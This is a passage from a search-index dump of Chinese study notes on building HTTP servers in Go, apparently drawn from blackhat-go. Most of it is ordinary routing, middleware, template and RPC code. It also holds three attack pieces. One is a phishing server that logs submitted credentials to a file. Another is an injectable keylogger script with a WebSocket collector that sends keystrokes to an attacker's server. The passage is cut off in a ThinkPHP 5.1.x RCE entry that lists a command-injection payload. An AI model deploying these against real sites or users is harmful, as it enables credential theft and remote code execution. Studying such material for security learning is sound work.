\u6ce8\u610fserver\u8fd9\u8fb9\u8bfb\u5199\u90fd\u6709timeout,\u4f46\u662fclient\u8fd9\u8fb9\u53ea\u6709\u5199\u6709timeout,\u56e0\u4e3a\u8bfb\u7684\u8bdd\u5e76\u4e0d\u80fd\u9884\u77e5\u4efb\u52a1\u5b8c\u6210\u7684\u65f6\u95f4 \u53ef\u4ee5\u5b66\u4e60\u4e0b rpcx \u597d\u50cf\u4f7f\u7528\u8d77\u6765\u66f4\u52a0\u7b80\u5355,\u800c\u4e14features\u4e5f\u5f88\u591a \u4e00\u4e2a\u7b80\u5355\u7684\u670d\u52a1\u5668\u5982\u4e0b package main import ( \"context\" \"flag\" \"fmt\" example \"github.com/rpcxio/rpcx-examples\" \"github.com/smallnest/rpcx/server\" ) var ( addr = flag . String ( \"addr\" , \"localhost:8888\" , \"server address\" ) ) type Arith struct {} // the second parameter is not a pointer func ( t * Arith ) Mul ( ctx context . Context , args example . Args , reply * example . Reply ) error { reply . C = args . A * args . B fmt . Println ( \"C=\" , reply . C ) return nil } func main () { flag . Parse () s := server . NewServer () //s.Register(new(Arith), \"\") s . RegisterName ( \"Arith\" , new ( Arith ), \"\" ) err := s . Serve ( \"tcp\" , * addr ) if err != nil { panic ( err ) } } \u4e00\u4e2a\u7b80\u5355\u7684\u5ba2\u6237\u7aef\u5982\u4e0b,\u8fd9\u91cc\u503c\u5f97\u6ce8\u610f\u7684\u662f\u6839\u636egithub\u7684Readme\u6240\u8bf4,\u56e0\u4e3arpcx\u4f9d\u8d56\u4e8eetcd,\u800cetcd\u5728go mods\u91cc\u4f7f\u7528\u5b58\u5728\u95ee\u9898,\u6240\u4ee5\u9700\u8981\u5728go.mod\u4e2d\u6dfb\u52a0 replace google.golang.org/grpc => google.golang.org/grpc v1.29.0 package main import ( \"context\" \"flag\" \"log\" \"github.com/smallnest/rpcx/protocol\" example \"github.com/rpcxio/rpcx-examples\" \"github.com/smallnest/rpcx/client\" ) var ( addr = flag . String ( \"addr\" , \"localhost:8888\" , \"server address\" ) ) func main () { flag . Parse () d := client . NewPeer2PeerDiscovery ( \"tcp@\" +* addr , \"\" ) opt := client . DefaultOption opt . SerializeType = protocol . JSON xclient := client . NewXClient ( \"Arith\" , client . Failtry , client . RandomSelect , d , opt ) defer xclient . Close () args := example . Args { A : 10 , B : 20 , } reply := & example . Reply {} err := xclient . Call ( context . Background (), \"Mul\" , args , reply ) if err != nil { log . Fatalf ( \"failed to call: %v\" , err ) } log . Printf ( \"%d * %d = %d\" , args . A , args . B , reply . C ) } \u53ef\u4ee5\u770b\u5230\u63a5\u6536\u53c2\u6570\u548c\u8fd4\u56de\u53c2\u6570\u7684\u5b9a\u4e49\u90fd\u5b58\u5728\u4e86 github.com/rpcxio/rpcx-examples \u91cc,\u5230\u65f6\u5019\u8981\u81ea\u5df1\u7f16\u5199\u7684\u8bdd\u53ef\u4ee5\u81ea\u5df1\u63d0\u524d\u5199\u597d\u4e22\u5230github\u4e0a \u53ef\u4ee5\u5b66\u4e60\u4e0b grpc-go (\u4f3c\u4e4e\u6982\u5ff5\u6bd4\u8f83\u591a \u6682\u65f6\u5495\u4e86)","title":"\u7b2c\u56db\u7ae0-HTTP\u670d\u52a1\u5668"},{"location":"%E5%AE%89%E5%85%A8/golang/%E7%AC%AC%E5%9B%9B%E7%AB%A0-HTTP%E6%9C%8D%E5%8A%A1%E5%99%A8/#\u7b2c\u56db\u7ae0-http\u670d\u52a1\u5668","text":"","title":"\u7b2c\u56db\u7ae0-HTTP\u670d\u52a1\u5668"},{"location":"%E5%AE%89%E5%85%A8/golang/%E7%AC%AC%E5%9B%9B%E7%AB%A0-HTTP%E6%9C%8D%E5%8A%A1%E5%99%A8/#\u4e00\u4e2a\u7b80\u5355\u7684http\u670d\u52a1\u5668","text":"package main import ( \"fmt\" \"net/http\" ) func hello ( w http . ResponseWriter , r * http . Request ) { name := r . URL . Query (). Get ( \"name\" ) fmt . Fprintf ( w , \"Hello, %s\\n\" , name ) } func main () { http . HandleFunc ( \"/hello\" , hello ) http . ListenAndServe ( \":8000\" , nil ) }","title":"\u4e00\u4e2a\u7b80\u5355\u7684http\u670d\u52a1\u5668"},{"location":"%E5%AE%89%E5%85%A8/golang/%E7%AC%AC%E5%9B%9B%E7%AB%A0-HTTP%E6%9C%8D%E5%8A%A1%E5%99%A8/#\u4f7f\u7528\u52a8\u6001\u8def\u7531\u7684\u670d\u52a1\u5668","text":"package main import ( \"fmt\" \"net/http\" \"strings\" ) type router struct { } func ( r * router ) ServeHTTP ( w http . ResponseWriter , req * http . Request ) { urlpath := req . URL . Path if strings . HasPrefix ( urlpath , \"/a\" ) { fmt . Fprint ( w , \"hello a\" ) } else if strings . HasPrefix ( urlpath , \"/b\" ) { fmt . Fprint ( w , \"hello b\" ) } else if strings . HasPrefix ( urlpath , \"/c\" ) { fmt . Fprint ( w , \"hello c\" ) } else { http . Error ( w , \"404 not found\" , 404 ) } } func main () { http . ListenAndServe ( \":8000\" , & router {}) }","title":"\u4f7f\u7528\u52a8\u6001\u8def\u7531\u7684\u670d\u52a1\u5668"},{"location":"%E5%AE%89%E5%85%A8/golang/%E7%AC%AC%E5%9B%9B%E7%AB%A0-HTTP%E6%9C%8D%E5%8A%A1%E5%99%A8/#\u4e00\u4e2a\u7b80\u5355\u7684\u4e2d\u95f4\u4ef6","text":"package main import ( \"fmt\" \"log\" \"net/http\" ) type logger struct { Inner http . Handler } func ( l * logger ) ServeHTTP ( w http . ResponseWriter , r * http . Request ) { log . Print ( \"start\" ) l . Inner . ServeHTTP ( w , r ) log . Print ( \"end\" ) } func hello ( w http . ResponseWriter , r * http . Request ) { fmt . Fprint ( w , \"hello\\n\" ) } func main () { f := http . HandlerFunc ( hello ) http . ListenAndServe ( \":8000\" , & logger { Inner : f }) } \u8fd9\u91cc\u5b9e\u73b0\u4e86\u4e00\u79cd\u7c7b\u4f3c\u4e8e\u88c5\u9970\u5668\u7684\u601d\u60f3. \u9996\u5148http.HandlerFunc\u7684\u5b9a\u4e49\u548c\u65b9\u6cd5\u5982\u4e0b,\u53ef\u4ee5\u770b\u5230HandlerFunc\u5373 func(ResponseWriter, *Request) \u7684\u522b\u540d,\u5f53\u8c03\u7528ServeHTTP\u51fd\u6570\u7684\u65f6\u5019\u4f1a\u56de\u8c03\u8c03\u7528\u8be5\u51fd\u6570\u672c\u8eab,\u4ece\u800c\u8c03\u7528\u6211\u4eec\u4f8b\u5b50\u4e2d\u7684hello\u51fd\u6570 // The HandlerFunc type is an adapter to allow the use of // ordinary functions as HTTP handlers. If f is a function // with the appropriate signature, HandlerFunc(f) is a // Handler that calls f. type HandlerFunc func ( ResponseWriter , * Request ) // ServeHTTP calls f(w, r). func ( f HandlerFunc ) ServeHTTP ( w ResponseWriter , r * Request ) { f ( w , r ) } \u7136\u540e\u6211\u4eec\u5b9a\u4e49\u4e86\u4e00\u4e2a\u81ea\u5df1\u7684\u7ed3\u6784\u4f53logger,\u5305\u542b\u4e86\u4e00\u4e2aInner\u5c5e\u6027,\u7c7b\u578b\u4e3ahttp.Handler,\u800chttp.Handler\u7684\u5b9a\u4e49\u5982\u4e0b type Handler interface { ServeHTTP ( ResponseWriter , * Request ) } \u53ef\u4ee5\u770b\u5230\u662f\u4e00\u4e2a\u63a5\u53e3,\u53ea\u9700\u8981\u5b9e\u73b0\u4e86ServeHTTP\u8fd9\u4e2a\u65b9\u6cd5\u5373\u53ef,\u90a3\u4e48\u6211\u4eec\u7684HandlerFunc\u5c31\u80fd\u5145\u5f53Handler \u6700\u540e\u6211\u4eec\u5b9a\u4e49\u4e86logger\u7684ServeHTTP,\u6267\u884c\u67d0\u4e9b\u8bed\u53e5,\u56de\u8c03hello\u8fd9\u4e2a\u51fd\u6570\u7684ServeHTTP,\u6700\u540e\u518d\u6267\u884c\u67d0\u4e9b\u8bed\u53e5,\u5b9e\u73b0\u4e86\u7c7b\u4f3c\u4e8e\u88c5\u9970\u5668\u7684\u7ed3\u6784 \u8c03\u7528\u94fe\u4e3a: ListenAndServe\u4f7f\u7528logger\u4f5c\u4e3a\u8def\u7531->logger.ServeHTTP->hello.ServeHTTP->hello","title":"\u4e00\u4e2a\u7b80\u5355\u7684\u4e2d\u95f4\u4ef6"},{"location":"%E5%AE%89%E5%85%A8/golang/%E7%AC%AC%E5%9B%9B%E7%AB%A0-HTTP%E6%9C%8D%E5%8A%A1%E5%99%A8/#\u7b2c\u4e09\u65b9\u5305alice","text":"Alice\u63d0\u4f9b\u4e86\u4e00\u79cd\u4fbf\u6377\u7684\u65b9\u5f0f\u6765\u94fe\u63a5\u60a8\u7684HTTP\u4e2d\u95f4\u4ef6\u529f\u80fd\u548c\u5e94\u7528\u7a0b\u5e8f\u5904\u7406\u7a0b\u5e8f\u3002 \u5982\u679c\u4f7f\u7528Alice\u6765\u6539\u5199\u4e0a\u9762\u7684\u4e2d\u95f4\u4ef6\u7684\u8bdd,\u4ee3\u7801\u4f1a\u53d8\u6210 package main import ( \"fmt\" \"log\" \"net/http\" \"time\" \"github.com/justinas/alice\" ) func logHandler ( h http . Handler ) http . Handler { return http . HandlerFunc ( func ( w http . ResponseWriter , r * http . Request ) { log . Print ( \"start\" ) h . ServeHTTP ( w , r ) log . Print ( \"end\" ) }) } func timeoutHandler ( h http . Handler ) http . Handler { return http . TimeoutHandler ( h , 1 * time . Second , \"timed out\" ) } func hello ( w http . ResponseWriter , r * http . Request ) { fmt . Fprint ( w , \"hello\\n\" ) } func main () { middleWare := alice . New ( logHandler , timeoutHandler ) http . ListenAndServe ( \":8000\" , middleWare . Then ( http . HandlerFunc ( hello ))) } \u53ef\u4ee5\u770b\u5230alice\u5305\u7684\u4f5c\u7528\u5f88\u7b80\u5355,\u5e2e\u52a9\u6211\u4eec\u62fc\u63a5\u4e2d\u95f4\u4ef6,\u5728\u7ecf\u8fc7\u4e2d\u95f4\u4ef6\u8fc7\u540e\u518d\u6267\u884c\u6211\u4eec\u7684Handler","title":"\u7b2c\u4e09\u65b9\u5305:alice"},{"location":"%E5%AE%89%E5%85%A8/golang/%E7%AC%AC%E5%9B%9B%E7%AB%A0-HTTP%E6%9C%8D%E5%8A%A1%E5%99%A8/#\u7b2c\u4e09\u65b9\u5305mux","text":"\u7ed3\u5408\u4e86alice\u548cmux\u7684\u4e00\u4e2a\u7b80\u5355\u6d4b\u8bd5\u670d\u52a1\u5668\u5982\u4e0b package main import ( \"fmt\" \"log\" \"net/http\" \"time\" \"github.com/gorilla/mux\" \"github.com/justinas/alice\" ) func logHandler ( h http . Handler ) http . Handler { return http . HandlerFunc ( func ( w http . ResponseWriter , r * http . Request ) { log . Print ( \"start\" ) h . ServeHTTP ( w , r ) log . Print ( \"end\" ) }) } func timeoutHandler ( h http . Handler ) http . Handler { return http . TimeoutHandler ( h , 1 * time . Second , \"timed out\" ) } func hello ( w http . ResponseWriter , r * http . Request ) { value , ok := mux . Vars ( r )[ \"value\" ] w . WriteHeader ( http . StatusOK ) if ok { r . ParseForm () key := r . Form . Get ( \"key\" ) fmt . Fprintf ( w , \"key is %s, value is %s\\n\" , key , value ) } else { fmt . Fprintf ( w , \"hello\" ) } } func main () { middleWare := alice . New ( logHandler , timeoutHandler ) r := mux . NewRouter () s := r . PathPrefix ( \"/hello\" ). Subrouter () s . HandleFunc ( \"\" , hello ). Methods ( \"GET\" ) s . HandleFunc ( \"/\" , hello ). Methods ( \"GET\" ) s . HandleFunc ( \"/{value}\" , hello ). Methods ( \"POST\" ) http . ListenAndServe ( \":8000\" , middleWare . Then ( r )) }","title":"\u7b2c\u4e09\u65b9\u5305:mux"},{"location":"%E5%AE%89%E5%85%A8/golang/%E7%AC%AC%E5%9B%9B%E7%AB%A0-HTTP%E6%9C%8D%E5%8A%A1%E5%99%A8/#\u7b2c\u4e09\u65b9\u5305martini","text":"Martini\u66f4\u50cf\u662f\u96c6\u6210\u4e86\u524d\u9762\u6240\u6709\u7684\u5305\u7684\u7b2c\u4e09\u65b9\u5305,\u4e0d\u4f7f\u7528\u539f\u751f\u7684net/http\u5305 \u5177\u4f53\u4f7f\u7528\u67e5\u770b \u8fd9\u91cc ,\u503c\u5f97\u4e00\u63d0\u7684\u662f\u53ef\u4ee5\u5728 \u8fd9\u91cc \u627e\u5230\u8fd9\u4e2a\u7b2c\u4e09\u65b9\u5305\u7684\u4e2d\u95f4\u4ef6","title":"\u7b2c\u4e09\u65b9\u5305:Martini"},{"location":"%E5%AE%89%E5%85%A8/golang/%E7%AC%AC%E5%9B%9B%E7%AB%A0-HTTP%E6%9C%8D%E5%8A%A1%E5%99%A8/#html\u6a21\u677f","text":"golang\u4e2d\u81ea\u5e26\u6709html\u6a21\u677f\u7684\u5305: html/template ,\u4e00\u4e2a\u7b80\u5355\u7684\u4f7f\u7528\u5982\u4e0b package main import ( \"html/template\" \"net/http\" \"github.com/go-martini/martini\" ) type TemplateData struct { UserName string Password string } var x = `<html> <body> Hello {{.UserName}}. Your password is {{.Password}}. </body> </html>` func main () { m := martini . Classic () m . Get ( \"/\" , func () string { return \"Hello world!\" }) m . Get ( \"/hello/:UserName/:Password\" , func ( params martini . Params , w http . ResponseWriter ) { t , err := template . New ( \"hello\" ). Parse ( x ) if err != nil { w . WriteHeader ( 500 ) } td := TemplateData { UserName : params [ \"UserName\" ], Password : params [ \"Password\" ]} t . Execute ( w , td ) }) m . RunOnAddr ( \":8000\" ) }","title":"HTML\u6a21\u677f"},{"location":"%E5%AE%89%E5%85%A8/golang/%E7%AC%AC%E5%9B%9B%E7%AB%A0-HTTP%E6%9C%8D%E5%8A%A1%E5%99%A8/#credential-harvesting-attack\u51ed\u8bc1\u6536\u96c6\u653b\u51fb","text":"\u5b9e\u9645\u4e0a\u5c31\u662f\u9493\u9c7c,\u6838\u5fc3\u601d\u60f3\u662f\u521b\u5efa\u514b\u9686\u7f51\u7ad9,\u6b3a\u9a97\u7528\u6237\u8f93\u5165\u5b83\u7684\u51ed\u8bc1\u5e76\u8bb0\u5f55 blackhat-go\u91cc\u7ed9\u4e86\u4e00\u4e2a \u793a\u4f8b \u8fd9\u91cc\u9700\u8981\u5c06\u4e0b\u8f7d\u4e0b\u6765\u7684public/index.html\u4e2d\u7684\u8868\u5355action\u6539\u4e3a\"/login\" \u7136\u540e\u4f7f\u7528golang\u6784\u5efa\u4e00\u4e2a\u7b80\u5355\u7684http\u670d\u52a1\u5668\u7528\u4e8e\u7a83\u53d6\u51ed\u8bc1 package main import ( \"net/http\" \"os\" \"time\" \"github.com/gorilla/mux\" log \"github.com/sirupsen/logrus\" ) func login ( w http . ResponseWriter , r * http . Request ) { log . WithFields ( log . Fields { \"time\" : time . Now (). String (), \"username\" : r . FormValue ( \"_user\" ), \"password\" : r . FormValue ( \"_pass\" ), \"user-agent\" : r . UserAgent (), \"ip_address\" : r . RemoteAddr , }). Info ( \"login attempt\" ) http . Redirect ( w , r , \"/\" , 302 ) } func main () { fh , err := os . OpenFile ( \"credentials.txt\" , os . O_CREATE | os . O_APPEND | os . O_WRONLY , 0600 ) if err != nil { panic ( err ) } defer fh . Close () log . SetOutput ( fh ) r := mux . NewRouter () r . HandleFunc ( \"/login\" , login ). Methods ( \"POST\" ) r . PathPrefix ( \"/\" ). Handler ( http . FileServer ( http . Dir ( \"./public\" ))) log . Fatal ( http . ListenAndServe ( \":8080\" , r )) } \u8fd9\u91cc\u7528\u5230\u4e86http.FileServer\u548chttp.Dir,\u914d\u5408gorilla/mux,\u5c06public\u76ee\u5f55\u8bbe\u7f6e\u6210\u4e86web\u6839\u76ee\u5f55,\u51fd\u6570login\u7684\u4f5c\u7528\u5c31\u662f\u5c06\u7528\u6237post\u7684\u5185\u5bb9\u8bb0\u5f55\u5728\u65e5\u5fd7\u4e2d","title":"Credential Harvesting Attack(\u51ed\u8bc1\u6536\u96c6\u653b\u51fb)"},{"location":"%E5%AE%89%E5%85%A8/golang/%E7%AC%AC%E5%9B%9B%E7%AB%A0-HTTP%E6%9C%8D%E5%8A%A1%E5%99%A8/#keylogging-with-websocket\u4f7f\u7528websocket\u7684\u952e\u76d8\u8bb0\u5f55\u5668","text":"\u653b\u51fb\u573a\u666f\u662f\u81ea\u5df1\u67b6\u8bbe\u4e86\u4e00\u4e2a\u670d\u52a1\u5668\u6216\u8005\u67d0\u4e2a\u670d\u52a1\u5668\u4e0a\u5b58\u5728XSS\u6f0f\u6d1e,\u8fd9\u65f6\u53ef\u4ee5\u901a\u8fc7\u63d2\u5165\u67d0\u6bb5\u6076\u610fJS\u4ee3\u7801,\u901a\u8fc7Websocket\u5c06\u7528\u6237\u7684\u4efb\u4f55\u8f93\u5165\u53d1\u9001\u56de\u653b\u51fb\u8005\u7684\u670d\u52a1\u5668 \u9996\u5148\u9700\u8981\u4e00\u4e2a\u6d4b\u8bd5\u73af\u5883,blackhat-go\u63a8\u8350\u4f7f\u7528 JSBIN \u4e00\u6bb5\u6d4b\u8bd5\u7528\u7684HTML\u4ee3\u7801 <!DOCTYPE html> < html > < head > < title > Login </ title > </ head > < body > < script src = 'http://localhost:8080/logger.js' ></ script > < form action = '/login' method = 'post' > < input name = 'username' /> < input name = 'password' /> < input type = \"submit\" /> </ form > </ body > </ html > \u4e00\u6bb5\u7b80\u5355\u7684\u5efa\u7acbwebsocket\u7684logger.js (Go\u6a21\u677f) ( function () { var conn = new WebSocket ( \"ws://{{.}}/ws\" ); document . onkeypress = keypress ; function keypress ( evt ) { s = String . fromCharCode ( evt . which ); conn . send ( s ); } })(); \u7136\u540e\u4e00\u4e2a\u7528\u4e8e\u63d0\u4f9blogger.js\u548c\u5904\u7406websocket\u7684\u670d\u52a1\u5668,\u8fd9\u91cc\u7528\u5230\u4e86 websocket \u7b2c\u4e09\u65b9\u5305 package main import ( \"flag\" \"fmt\" \"html/template\" \"log\" \"net/http\" \"github.com/gorilla/mux\" \"github.com/gorilla/websocket\" ) var ( upgrader = websocket . Upgrader { CheckOrigin : func ( r * http . Request ) bool { return true }, } listenAddr string wsAddr string jsTemplate * template . Template ) func init () { flag . StringVar ( & listenAddr , \"listen\" , \"\" , \"Address to listen on\" ) flag . StringVar ( & wsAddr , \"ws\" , \"\" , \"Address for WebSocket connection\" ) flag . Parse () var err error jsTemplate , err = template . ParseFiles ( \"logger.js\" ) if err != nil { panic ( err ) } } func serveWS ( w http . ResponseWriter , r * http . Request ) { conn , err := upgrader . Upgrade ( w , r , nil ) if err != nil { http . Error ( w , \"\" , 500 ) return } defer conn . Close () fmt . Printf ( \"Connection from %s\\n\" , conn . RemoteAddr (). String ()) for { _ , msg , err := conn . ReadMessage () if err != nil { return } fmt . Printf ( \"From %s: %s\\n\" , conn . RemoteAddr (). String (), string ( msg )) } } func serveLogger ( w http . ResponseWriter , r * http . Request ) { w . Header (). Set ( \"Content-Type\" , \"application/javascript\" ) jsTemplate . Execute ( w , wsAddr ) } func main () { r := mux . NewRouter () r . HandleFunc ( \"/ws\" , serveWS ) r . HandleFunc ( \"/logger.js\" , serveLogger ) fmt . Println ( \"test\" , wsAddr ) log . Fatal ( http . ListenAndServe ( \":8080\" , r )) } websocket\u8fd8\u662f\u5f88\u597d\u73a9\u7684,\u5b9e\u9645\u6548\u679c\u5982\u4e0b \u8f6c\u79fb\u7b14\u8bb0\u7684\u65f6\u5019\u56fe\u5f04\u4e22\u4e86\uff0c\u5404\u4f4d\u5e08\u5085\u4eec\u8bf7\u81ea\u5df1\u624b\u52a8\u6d4b\u8bd5\u4e0b\u4ee3\u7801\u5427","title":"Keylogging With Websocket(\u4f7f\u7528Websocket\u7684\u952e\u76d8\u8bb0\u5f55\u5668)"},{"location":"%E5%AE%89%E5%85%A8/golang/%E7%AC%AC%E5%9B%9B%E7%AB%A0-HTTP%E6%9C%8D%E5%8A%A1%E5%99%A8/#reverse-proxy\u53cd\u5411\u4ee3\u7406","text":"golang\u81ea\u5e26\u7684httputil\u5305\u4e2d\u5b58\u5728ReverseProxy\u7684\u5b9e\u73b0,\u4e00\u4e2a\u7b80\u5355\u7684\u53cd\u5411\u4ee3\u7406\u5982\u4e0b package main import ( \"log\" \"net/http\" \"net/http/httputil\" \"net/url\" ) func main () { // \u5c06 http://127.0.0.1:8888/ \u53cd\u5411\u4ee3\u7406\u5230 http://127.0.0.1:80/ targetUrlString := \"http://127.0.0.1:80/\" targetUrl , err := url . Parse ( targetUrlString ) if err != nil { log . Fatal ( \"err\" ) } proxy := httputil . NewSingleHostReverseProxy ( targetUrl ) log . Println ( \"Reverse proxy server at 127.0.0.1:8888\" ) if err := http . ListenAndServe ( \":8888\" , proxy ); err != nil { log . Fatalln ( \"Error:\" , err ) } }","title":"Reverse Proxy(\u53cd\u5411\u4ee3\u7406)"},{"location":"%E5%AE%89%E5%85%A8/golang/%E7%AC%AC%E5%9B%9B%E7%AB%A0-HTTP%E6%9C%8D%E5%8A%A1%E5%99%A8/#\u7b80\u5355\u7684rpc\u670d\u52a1\u5668","text":"\u53c2\u8003\u6587\u7ae0: Go\u5b98\u65b9\u5e93RPC\u5f00\u53d1\u6307\u5357 \u4f7f\u7528golang\u4e2d\u81ea\u5e26\u7684 net/rpc \u5305\u7f16\u5199\u4e00\u4e2a\u7b80\u5355\u7684rpc\u670d\u52a1\u5668(\u53ef\u4ee5\u7528\u4e8e\u5b9e\u73b0\u7c7b\u4f3c\u52a8\u6001\u5bfc\u5165\u7684\u529f\u80fd) \u9996\u5148\u5b9a\u4e49\u4e00\u4e2a rpc_client.go package rpc_server import ( \"errors\" \"log\" \"net\" \"net/http\" \"net/rpc\" ) type Args struct { // \u4f20\u5165\u53c2\u6570\u7ed3\u6784 A , B int } // \u8fd4\u56de\u53c2\u6570\u7ed3\u6784 type Quotient struct { Quo , Rem int } // rpc\u670d\u52a1\u5668\u8981\u5b9e\u73b0\u7684\u63a5\u53e3 type ServiceInterface interface { Multiply ( args * Args , reply * int ) error Divide ( args * Args , quo * Quotient ) error } // \u7a7a\u7684\u7ed3\u6784,\u7528\u4e8e\u5b9e\u73b0rpc\u670d\u52a1\u5668\u63a5\u53e3 type Service struct { } // \u5b9e\u73b0Multiply\u65b9\u6cd5 func ( ss * Service ) Multiply ( args * Args , reply * int ) error { * reply = args . A * args . B return nil } // \u5b9e\u73b0Divide\u65b9\u6cd5 func ( ss * Service ) Divide ( args * Args , quo * Quotient ) error { if args . B == 0 { return errors . New ( \"Divide by zero\" ) } quo . Quo = args . A / args . B quo . Rem = args . A % args . B return nil } // \u5f00\u59cb\u76d1\u542c\u7aef\u53e3,\u5904\u7406\u8fde\u63a5 func Start () { s := new ( Service ) rpc . Register ( s ) rpc . HandleHTTP () l , e := net . Listen ( \"tcp\" , \":8888\" ) if e != nil { log . Fatal ( \"listen error:\" , e ) } go http . Serve ( l , nil ) } \u7136\u540e\u7f16\u5199 rpc_client.go package rpc_client import ( \"fmt\" \"learn/rpc_server\" \"log\" \"net/rpc\" ) const ServiceName = \"Service\" // \u8fde\u63a5\u5230rpc\u670d\u52a1\u5668\u5e76\u4e14\u8fdc\u7a0b\u8c03\u7528Multiply\u65b9\u6cd5 func Connect ( address string ) { client , err := rpc . DialHTTP ( \"tcp\" , address ) if err != nil { log . Fatal ( \"Dial error:\" , err ) } args := & rpc_server . Args { A : 7 , B : 8 } var reply int err = client . Call ( ServiceName + \".Multiply\" , args , & reply ) if err != nil { log . Fatal ( \"Error:\" , err ) } fmt . Printf ( \"Multiply: %d*%d=%d\" , args . A , args . B , reply ) } \u6700\u540e\u7f16\u5199\u4e00\u4e2amain.go\u505a\u6d4b\u8bd5 package main import ( \"learn/rpc_client\" \"learn/rpc_server\" \"time\" ) func main () { rpc_server . Start () time . Sleep ( 1 * time . Second ) rpc_client . Connect ( \"127.0.0.1:8888\" ) } \u5b9e\u73b0\u6548\u679c\u5982\u4e0b \u8f6c\u79fb\u7b14\u8bb0\u7684\u65f6\u5019\u56fe\u5f04\u4e22\u4e86\uff0c\u5404\u4f4d\u5e08\u5085\u4eec\u8bf7\u81ea\u5df1\u624b\u52a8\u6d4b\u8bd5\u4e0b\u4ee3\u7801\u5427 \u7136\u800cgolang\u4e2d\u81ea\u5e26\u7684net/rpc\u5305\u5b58\u5728\u67d0\u4e9b\u7f3a\u70b9,\u5982: (\u53c2\u8003\u6587\u7ae0: Golang\u6807\u51c6\u5e93RPC\u5b9e\u8df5\u53ca\u6539\u8fdb ) \u5f53\u96c6\u7fa4\u673a\u5668\u589e\u52a0\u5230\u4e00\u5b9a\u6570\u91cf,\u8bf7\u6c42\u91cf\u53d8\u5927\u65f6,\u4f1a\u51fa\u73b0\u5f88\u591a\u4efb\u52a1\u5361\u4f4f\u6ca1\u6709\u54cd\u5e94\u7684\u60c5\u51b5,\u53ef\u4ee5\u8f6c\u7528tcp\u5b9e\u73b0rpc\u670d\u52a1\u5668\u89e3\u51b3 rpc\u5305\u91cc\u7684rpc.Dial\u51fd\u6570\u6ca1\u6709timeout, \u7cfb\u7edf\u9ed8\u8ba4\u662f\u6ca1\u6709timeout\u7684,\u6240\u4ee5\u5728\u8fd9\u91cc\u53ef\u80fd\u5361\u4f4f.\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u91c7\u7528net\u5305\u91cc\u7684 net.DialTimeout\u51fd\u6570 rpc\u5305\u91cc\u9ed8\u8ba4\u4f7f\u7528gobCodec\u6765\u7f16\u7801\u89e3\u7801, \u8fd9\u91ccio\u53ef\u80fd\u4f1a\u5361\u4f4f\u800c\u4e0d\u8fd4\u56de\u9519\u8bef,\u6240\u4ee5\u6211\u4eec\u8981\u81ea\u5df1\u7f16\u5199\u52a0\u5165timeout\u7684codec. \u6ce8\u610fserver\u8fd9\u8fb9\u8bfb\u5199\u90fd\u6709timeout,\u4f46\u662fclient\u8fd9\u8fb9\u53ea\u6709\u5199\u6709timeout,\u56e0\u4e3a\u8bfb\u7684\u8bdd\u5e76\u4e0d\u80fd\u9884\u77e5\u4efb\u52a1\u5b8c\u6210\u7684\u65f6\u95f4 \u53ef\u4ee5\u5b66\u4e60\u4e0b rpcx \u597d\u50cf\u4f7f\u7528\u8d77\u6765\u66f4\u52a0\u7b80\u5355,\u800c\u4e14features\u4e5f\u5f88\u591a \u4e00\u4e2a\u7b80\u5355\u7684\u670d\u52a1\u5668\u5982\u4e0b package main import ( \"context\" \"flag\" \"fmt\" example \"github.com/rpcxio/rpcx-examples\" \"github.com/smallnest/rpcx/server\" ) var ( addr = flag . String ( \"addr\" , \"localhost:8888\" , \"server address\" ) ) type Arith struct {} // the second parameter is not a pointer func ( t * Arith ) Mul ( ctx context . Context , args example . Args , reply * example . Reply ) error { reply . C = args . A * args . B fmt . Println ( \"C=\" , reply . C ) return nil } func main () { flag . Parse () s := server . NewServer () //s.Register(new(Arith), \"\") s . RegisterName ( \"Arith\" , new ( Arith ), \"\" ) err := s . Serve ( \"tcp\" , * addr ) if err != nil { panic ( err ) } } \u4e00\u4e2a\u7b80\u5355\u7684\u5ba2\u6237\u7aef\u5982\u4e0b,\u8fd9\u91cc\u503c\u5f97\u6ce8\u610f\u7684\u662f\u6839\u636egithub\u7684Readme\u6240\u8bf4,\u56e0\u4e3arpcx\u4f9d\u8d56\u4e8eetcd,\u800cetcd\u5728go mods\u91cc\u4f7f\u7528\u5b58\u5728\u95ee\u9898,\u6240\u4ee5\u9700\u8981\u5728go.mod\u4e2d\u6dfb\u52a0 replace google.golang.org/grpc => google.golang.org/grpc v1.29.0 package main import ( \"context\" \"flag\" \"log\" \"github.com/smallnest/rpcx/protocol\" example \"github.com/rpcxio/rpcx-examples\" \"github.com/smallnest/rpcx/client\" ) var ( addr = flag . String ( \"addr\" , \"localhost:8888\" , \"server address\" ) ) func main () { flag . Parse () d := client . NewPeer2PeerDiscovery ( \"tcp@\" +* addr , \"\" ) opt := client . DefaultOption opt . SerializeType = protocol . JSON xclient := client . NewXClient ( \"Arith\" , client . Failtry , client . RandomSelect , d , opt ) defer xclient . Close () args := example . Args { A : 10 , B : 20 , } reply := & example . Reply {} err := xclient . Call ( context . Background (), \"Mul\" , args , reply ) if err != nil { log . Fatalf ( \"failed to call: %v\" , err ) } log . Printf ( \"%d * %d = %d\" , args . A , args . B , reply . C ) } \u53ef\u4ee5\u770b\u5230\u63a5\u6536\u53c2\u6570\u548c\u8fd4\u56de\u53c2\u6570\u7684\u5b9a\u4e49\u90fd\u5b58\u5728\u4e86 github.com/rpcxio/rpcx-examples \u91cc,\u5230\u65f6\u5019\u8981\u81ea\u5df1\u7f16\u5199\u7684\u8bdd\u53ef\u4ee5\u81ea\u5df1\u63d0\u524d\u5199\u597d\u4e22\u5230github\u4e0a \u53ef\u4ee5\u5b66\u4e60\u4e0b grpc-go (\u4f3c\u4e4e\u6982\u5ff5\u6bd4\u8f83\u591a \u6682\u65f6\u5495\u4e86)","title":"\u7b80\u5355\u7684RPC\u670d\u52a1\u5668"},{"location":"%E5%AE%89%E5%85%A8/%E5%89%8D%E4%BA%BA%E4%B9%8B%E8%B7%AF/thinkphp%205.1.x%20RCE/","text":"thinkphp 5.1.x RCE # \u53c2\u8003\u6587\u7ae0 # https://xz.aliyun.com/t/9369 RCE1 # \u6839\u672c\u539f\u56e0 # thinkphp\u6ca1\u6709\u5bf9\u7528\u6237\u4f20\u5165\u7684\u64cd\u4f5c\u5668\u540d\u79f0\u8fdb\u884c\u8fc7\u6ee4,\u5bfc\u81f4\u53ef\u4ee5\u8c03\u7528\u9876\u90e8\u7c7b\u4e2d\u7684\u65b9\u6cd5,\u9020\u6210\u4e00\u7cfb\u5217\u7684\u5371\u5bb3 \u5f71\u54cd\u7248\u672c # TP5.1.0-5.1.30 payload # ?s=index/\\think\\Request/input&filter[]=system&data=pwd ?s=index/\\think\\view\\driver\\Php/display&content= 